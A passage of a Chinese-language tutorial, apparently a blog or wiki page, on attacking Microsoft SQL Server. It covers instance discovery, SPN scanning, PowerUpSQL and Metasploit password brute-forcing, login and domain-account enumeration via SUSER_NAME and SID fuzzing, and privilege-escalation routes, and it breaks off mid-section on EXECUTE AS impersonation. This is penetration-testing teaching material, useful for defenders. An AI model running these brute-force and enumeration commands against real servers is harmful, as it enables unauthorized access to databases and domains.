href="#SQL-Server%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">SQL Server口令爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">SQL Server权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E4%BD%8E%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.3.1.</span> <span class="toc-text">获得低权限账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9C%AC%E5%9C%B0%E6%88%96%E5%9F%9F%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7"><span class="toc-number">1.3.2.</span> <span class="toc-text">使用本地或域用户账号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8EPublic%E5%88%B0Sysadmin"><span class="toc-number">1.3.3.</span> <span class="toc-text">从Public到Sysadmin</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Public%E8%8E%B7%E5%BE%97%E6%9B%B4%E5%A4%9A%E6%9D%83%E9%99%90"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用Public获得更多权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%88%B0Sysadmin"><span class="toc-number">1.3.5.</span> <span class="toc-text">从系统管理员到Sysadmin</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.4.</span> <span class="toc-text">SQL Server权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AB%98%E9%9A%90%E8%94%BD%E6%80%A7%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.4.1.</span> <span class="toc-text">高隐蔽性持久化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.4.2.</span> <span class="toc-text">其他方式实现持久化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.5.</span> <span class="toc-text">SQL Server横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Kerberoast%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.1.</span> <span class="toc-text">Kerberoast攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CLR%E5%AE%9E%E7%8E%B0%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">CLR实现无文件落地横向移动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.3.</span> <span class="toc-text">UNC路径注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">2.</span> <span class="toc-text">参考资料</span></a></li></ol>
                </div>
            
        
        
            <p>[TOC]</p>
<h2 id="SQL-Server攻击实战思路"><a href="#SQL-Server攻击实战思路" class="headerlink" title="SQL Server攻击实战思路"></a>SQL Server攻击实战思路</h2><p>第二章简单介绍了SQL Server中常见的一写利用点，接下来介绍这些利用面在各个攻击阶段中的应用和一些思路。</p>
<h3 id="SQL-Server实例发现"><a href="#SQL-Server实例发现" class="headerlink" title="SQL Server实例发现"></a>SQL Server实例发现</h3><p>SQL Server的实例发现-，本地实例主要是通过检查系统服务和注册表方式。远程实例可以通过扫描TDS监听服务、UDP广播、SPN服务等方式。</p>
<p>常见的几种实例发现-工具：</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/sql/tools/osql-utility?view=sql-server-2017">osql</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">osql -L</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-1.png"></p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-2017">sqlcmd</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlcmd -L</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-2.png"></p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast  //SQL Server实例发现-</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-3.png"></p>
<ul>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.sqlsecurity.com/downloads">SQLPing3</a></p>
</li>
<li><p>Metasploit mssql_ping module</p>
</li>
<li><p>Nmap</p>
</li>
<li><p>Nessus</p>
</li>
<li><p>……</p>
</li>
</ul>
<h4 id="本地实例发现"><a href="#本地实例发现" class="headerlink" title="本地实例发现"></a>本地实例发现</h4><p>作为本地用户，主要是通过检查系统服务和注册表设置来标识SQL Server实例。</p>
<p>检查系统服务</p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-5.png"></p>
<p>检查注册表键值，也可判断SQL Server实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server&quot; /v InstalledInstances</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-6.png"></p>
<p>使用PowerUpSQL，来识别本地实例。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块</span><br><span class="line">Get-SQLInstanceLocal  //SQL Server实例发现-</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-4.png"></p>
<h4 id="远程实例发现"><a href="#远程实例发现" class="headerlink" title="远程实例发现"></a>远程实例发现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceBroadcast -Verbose //UDP广播Ping</span><br><span class="line">Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1 //UDP端口扫描 </span><br><span class="line">Get-SQLInstanceFile -FilePath c:\temp\computers.txt | Get-SQLInstanceScanUDPThreaded -Verbose //从文件获取实例列表 </span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/PowerUpSQL-3.png"></p>
<h4 id="域内实例发现"><a href="#域内实例发现" class="headerlink" title="域内实例发现"></a>域内实例发现</h4><p>域内实例主要利用SPN扫描发现实例，先简单介绍一下什么是SPN服务。</p>
<h4 id="SPN服务"><a href="#SPN服务" class="headerlink" title="SPN服务"></a>SPN服务</h4><p>Windows 域环境是基于活动目录（Active Directory）服务工作的。为了在域环境中有效地对资源访问权限进行精细控制，提高网络环境的安全性和方便网络资源统一分配管理。系统给域内每种资源分配了不同的服务主体名称（Service Principal Name, SPN）。使用Kerberos协议进行身份验证的域环境中，本地账号SPN将自动注册，但是，域内用户账号下运行的服务，必须为此域内账户手动注册。如下图SQL Server服务运行在域内用户时的状态。</p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-8.png"></p>
<p>因为域中每台机器都要在Kerberos身份验证服务中注册SPN，所以攻击者可以向域控制器（AD）发送请求，获取SPN相关信息，得到某个服务资源在哪台服务器上。</p>
<p>SQL Server服务的SPN示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV/MSSQL2.sec.com:1433</span><br><span class="line">服务组件名称/主机名.域名:监听端口</span><br></pre></td></tr></table></figure>

<p>域内用户账号下运行的服务，手动注册SPN</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/MSSQL2.sec.com:1433 mssqluser</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-9.png"></p>
<p>更多SPN相关介绍请查看：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx">https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spn-setspn-syntax.aspx</a></p>
<p>域中安装的SQL Server会使用关联的服务帐户自动在活动目录（Active Directory）中注册，以支持Kerberos身份验证。可以使用以下方式识别实例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-7.png"></p>
<ul>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx">setspn.exe</a>。</p>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.joeware.net/freetools/tools/adfind/index.htm">adfind.exe</a>。</p>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1">Get-Spn.psm1</a>。</p>
</li>
<li><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLInstanceDomain</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-10.png"></p>
<p>PowerUpSQL其他发现实例命令</p>
<table>
<thead>
<tr>
<th>描述</th>
<th align="center">命令</th>
</tr>
</thead>
<tbody><tr>
<td>使用备用域凭据发现Active Directory域SQL Server实例</td>
<td align="center">runas /noprofile /netonly /user:domain\user PowerShell.exe import-module PowerUpSQL.psd1<code> </code>Get-SQLInstanceDomain -Verbose -DomainController 192.168.1.1 -Username domain\user -password Password123</td>
</tr>
<tr>
<td>列出使用特定域帐户的SQL Server实例</td>
<td align="center">Get-SQLInstanceDomain -Verbose -DomainAccount mssqluser</td>
</tr>
<tr>
<td>列出共享域用户SQL Server服务帐户</td>
<td align="center">Get-SQLInstanceDomain -Verbose | Group-Object DomainAccount | Sort-Object count -Descending | select Count,Name | Where-Object {($<em>.name -notlike “$”) -and ($</em>.count -gt 1) }</td>
</tr>
</tbody></table>
<h3 id="SQL-Server口令爆破"><a href="#SQL-Server口令爆破" class="headerlink" title="SQL Server口令爆破"></a>SQL Server口令爆破</h3><p>连接测试，两种功能均可用于测试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line">Invoke-SQLAuditWeakLoginPw </span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E5%AE%9E%E4%BE%8B%E5%8F%91%E7%8E%B0-11.png"></p>
<p>爆破必须的几个条件：</p>
<ul>
<li>常见的弱密码</li>
<li>当前的本地用户访问权限</li>
<li>当前域用户访问权限</li>
<li>备用域用户访问权限</li>
</ul>
<p>使用msf来执行爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-1.png"></p>
<p>PowerUpSQL其他获取账户相关命令：</p>
<table>
<thead>
<tr>
<th>描述</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>获取可用提供的SQL Server登录名登录的域SQL Server列表</td>
<td>$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username testuser -password testpass | Where-Object {$_.Status -like “Accessible”} $Targets</td>
</tr>
<tr>
<td>获取可以使用当前域帐户登录的域SQL服务器的列表</td>
<td>$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like “Accessible”} $Targets</td>
</tr>
<tr>
<td>获取可以使用备用域帐户登录的域SQL服务器的列表</td>
<td>runas /noprofile /netonly /user:domain\user PowerShell.exe<code> </code>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 15</td>
</tr>
<tr>
<td>获取可以使用非域系统中的备用域帐户登录的域SQL服务器的列表。</td>
<td>runas /noprofile /netonly /user:domain\user PowerShell.exe<code> </code>Get-SQLInstanceDomain -Verbose -Username ‘domain\user’ -Password ‘MyPassword!’ -DomainController 10.1.1.1 | Get-SQLConnectionTestThreaded -Verbose -Threads 15</td>
</tr>
<tr>
<td>发现域SQL Server，并根据实例名称确定它们是否配置有普通应用程序使用的默认密码</td>
<td>Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose</td>
</tr>
</tbody></table>
<h3 id="SQL-Server权限提升"><a href="#SQL-Server权限提升" class="headerlink" title="SQL Server权限提升"></a>SQL Server权限提升</h3><p>权限提升基本的一个思路：</p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-0.png"></p>
<p>域用户可以到处登录的前置条件。</p>
<ul>
<li>添加了域用户</li>
<li>已添加本地用户</li>
<li>特权继承</li>
</ul>
<p>获得Sysadmin权限的一些利用点：</p>
<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1.png"></p>
<h4 id="获得低权限账号"><a href="#获得低权限账号" class="headerlink" title="获得低权限账号"></a>获得低权限账号</h4><p>可以使用常用的凭据执行爆破，但要注意帐户锁定。</p>
<p>以PowerUpSQL为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块。</span><br><span class="line">Get-SQLInstanceScanUDP | Invoke-SQLAuditWeakLoginPw //从未经身份验证的用户角度发起攻击。</span><br><span class="line">Get-SQLInstanceDomain | Invoke-SQLAuditWeakLoginPw //从域用户角度开始攻击。</span><br><span class="line">Get-SQLInstanceScanUDP | Get-SQLConnectionTestThreaded -Username &lt;USERNAME&gt; -Password &lt;PASSWORD&gt; //手动连接到已标识的SQL Server实例。</span><br></pre></td></tr></table></figure>

<p>许多使用SQL Server Express作为后端的应用程序都是使用特定的凭据和实例名称配置的。使用以下命令检查这些凭据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1 //加载模块。</span><br><span class="line">Get-SQLInstanceDomain | Invoke-SQLAuditDefaultLoginPw</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw</span><br></pre></td></tr></table></figure>

<p>如果与SQL Server的通信未加密，我们可以执行MITM攻击来注入们自己的查询。根据欺骗的用户特权，我们可以注入SQL登录名。</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gist.github.com/anonymous/edb02df90942dc4df0e41f3cbb78660b">sqlmitm.py</a></li>
</ul>
<h4 id="使用本地或域用户账号"><a href="#使用本地或域用户账号" class="headerlink" title="使用本地或域用户账号"></a>使用本地或域用户账号</h4><p>尝试使用当前帐户登录到SQL Server。过多的登录特权是常见的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.psd1</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLConnectionTest</span><br><span class="line">Get-SQLInstanceLocal | Get-SQLConnectionTest</span><br></pre></td></tr></table></figure>

<h4 id="从Public到Sysadmin"><a href="#从Public到Sysadmin" class="headerlink" title="从Public到Sysadmin"></a>从Public到Sysadmin</h4><p>猜测弱密码获得高权限角色账号，一般需要以下两步：</p>
<ul>
<li>枚举登录名</li>
<li>猜测密码</li>
</ul>
<p><strong>1.枚举登录名</strong></p>
<p>默认情况下，Public角色成员不能选择本地列表登录，但可以进行Fuzz登录名。如果尝试枚举所有SQL Server登录名枚举，则只会看到其中一部分。查询出所有SQL Server登录名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.syslogins</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM sys.server_principals</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3.png"></p>
<p>suser_name返回给定主体ID的主体名称。可以通过使用Public角色，在suser_name函数中枚举主体ID值来标识SQL登录名。查询示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_NAME(1)</span><br><span class="line">SELECT SUSER_NAME(2)</span><br><span class="line">SELECT SUSER_NAME(3)</span><br><span class="line">SELECT SUSER_NAME(4)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-4.png"></p>
<p><strong>2.猜测密码</strong></p>
<p>使用PowerUpSQL尝试对那些已识别出的的SQL Server登录名使用弱口令爆破。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzServerLogin -Instance ComputerNAme\InstanceName  //PowerUpSQL Blind SQL登录枚举</span><br><span class="line">Invoke-SQLAuditWeakLoginPw  </span><br></pre></td></tr></table></figure>

<p><strong>3.获取当前域内用户名</strong></p>
<p>public角色可以获取当前域信息，有利用盲猜域内其他组SID或用户名。</p>
<p>获取SQL Server所在的域：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEFAULT_DOMAIN() as mydomain</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-5.png"></p>
<p>获取域内用户的完整SID。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#x27;&lt;Identified_Domain&gt;\Domain Admins&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-8.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619851040000</span><br></pre></td></tr></table></figure>

<p>获取域内Admins组的完整RID。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUSER_SID(&#x27;&lt;Identified_Domain&gt;\Domain Admins&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-6.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x010500000000000515000000CAAE870FA5F89ACD856A619800020000</span><br></pre></td></tr></table></figure>

<p>抓取完整RID的前48个字节以获取域的SID。通过将十六进制数字值附加到先前的SID来创建新的RID（将与域对象相关联）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RID=0x010500000000000515000000CAAE870FA5F89ACD856A619851040000</span><br><span class="line">SELECT SUSER_NAME(RID)  //获取与RID关联的域对象名称。</span><br></pre></td></tr></table></figure>

<p>PowerUpSQL也可盲猜域帐户。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-SQLFuzzDomainAccount -Instance ComputerNAme\InstanceName</span><br></pre></td></tr></table></figure>

<h4 id="利用Public获得更多权限"><a href="#利用Public获得更多权限" class="headerlink" title="利用Public获得更多权限"></a>利用Public获得更多权限</h4><p>在具有对SQL Server的Public权限账号的上下文中，最常用的获取执行权限的方法是：</p>
<ul>
<li>特权模拟</li>
<li>存储过程和触发器创建/注入</li>
<li>写入存储过程的自动执行</li>
<li>SQL Server代理任务</li>
<li>xp_cmdshell</li>
<li>创建数据库链接到文件或服务器</li>
<li>导入/安装自定义CLR程序集</li>
<li>临时查询</li>
<li>共享服务帐户</li>
<li>数据库链接</li>
<li>UNC路径注入</li>
<li>Python/R脚本执行。</li>
</ul>
<p>以上大部分内容在SQL Server常用攻击面已经介绍，不再赘述，下面简单介绍一下前面未提的方法。</p>
<p><strong>1.特权模拟</strong></p>
<p>SQL Server中有一个特权/权限，它允许权限较低的用户，模拟行使另一个具有更多访问权限的用户。不限制执行查询/命令，但必须将数据库配置为允许OS命令执行对象。</p>
<p><strong>EXECUTE AS语句</strong></p>
<p>默认情况下，会话在用户登录时开始，并在用户注销时结束。会话期间的所有操作都必须对该用户进行权限检查。当一个<strong>EXECUTE AS</strong>语句运行，会话的执行上下文切换到指定的登录名或用户名。上下文切换之后，将针对该帐户的登录名和用户安全性令牌而不是调用<strong>EXECUTE AS</strong>语句的人员检查权限。本质上，在会话或模块执行期间将模拟用户或登录帐户，或者显式还原上下文切换。</p>
<p>使用public角色用户testuser，手动检查是否是sa登录：</p>
